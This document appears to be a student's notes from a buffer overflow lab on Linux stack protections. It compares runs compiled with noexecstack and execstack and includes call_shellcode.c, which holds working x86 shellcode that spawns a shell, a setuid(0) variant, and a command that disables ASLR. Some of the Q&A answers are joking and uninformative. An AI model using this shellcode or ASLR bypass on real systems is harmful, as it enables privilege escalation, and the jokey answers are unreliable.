# Understand the countermeasures to buffer overflow applied by Linux OS

## Compile with `noexecstack`

```bash
# compile call_shellcode.c
gcc -o call_shellcode -z noexecstack -fstack-protector call_shellcode.c
# run the COMPILED program
./call_shellcode
# output:
Segmentation fault (core dumped)
```

<question></question>
What does this tell me?
<answer></answer>
The "Segmentation fault" error message indicates that the program has attempted to access memory that it is not allowed to access, such as trying to read from or write to memory that has not been allocated to the program.

Core dumped means when a part of code tries to perform read and write operation on a read-only or free location.

<question></question>
Yea but seriously, What does this tell me?
<answer></answer>
chirp chirp

## Compile with `execstack`

```bash
# compile call_shellcode.c
gcc -o call_shellcode -z execstack -fstack-protector call_shellcode.c
# run the COMPILED program
./call_shellcode
# output:
$
```

<question></question>
So what's different?

<answer></answer>
This one has a dollar sign and everyone loves dollar's, but in technical terms I have no idea!

Is it possible to call a root shell by using this c program? I think so.


<!--



The command "sudo sysctl -w kernel.randomize_va_space=0" is used to disable Address Space Layout Randomization (ASLR) on a Unix-like system, specifically in the kernel's virtual memory subsystem.

ASLR is a security feature that randomizes the location of code and data in a process's address space, making it more difficult for an attacker to predict the location of vulnerable code or to execute a successful exploit. By default, ASLR is enabled on many Unix-like systems.

The "sudo" command is used to run the "sysctl" command with administrative privileges. "sysctl" is a command that allows you to view and modify kernel parameters in real-time.

In this case, the "-w" option is used to set the value of the "kernel.randomize_va_space" parameter to "0", which effectively disables ASLR. This means that the kernel will no longer randomize the location of code and data in a process's address space.

Disabling ASLR can be useful in some cases, such as when debugging an application or when running legacy software that is not compatible with ASLR. However, it also increases the risk of successful attacks against vulnerable code, as the attacker can now more easily predict the location of code and data in a process's address space.

It is important to use caution when disabling security features like ASLR, and only do so when necessary and with a clear understanding of the risks involved.



 $gcc -o call_shellcode -z noexecstack -fstack-protector call_shellcode.c
1. Try $gcc -o call_shellcode -z execstack -fstack-protector call_shellcode.c
2. Is it possible to call a root shell by using this c program? Demonstrate how a root shell is
prompted by compiling and running call_shellcode.c.
Task 4: Practice -->

```c
// call_shellcode.c

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
// Binary code for setuid(0)
// 64-bit: "\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05"
// 32-bit: "\x31\xdb\x31\xc0\xb0\xd5\xcd\x80"
const char shellcode[] =
#if __x86_64__
    "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
    "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
    "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
#else
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    "\xd2\x31\xc0\xb0\x0b\xcd\x80"
#endif
;
int main(int argc, char **argv)
{
    char code[500];
    strcpy(code, shellcode);
    int (*func)() = (int(*)())code;
    func();
    return 1;
}
```
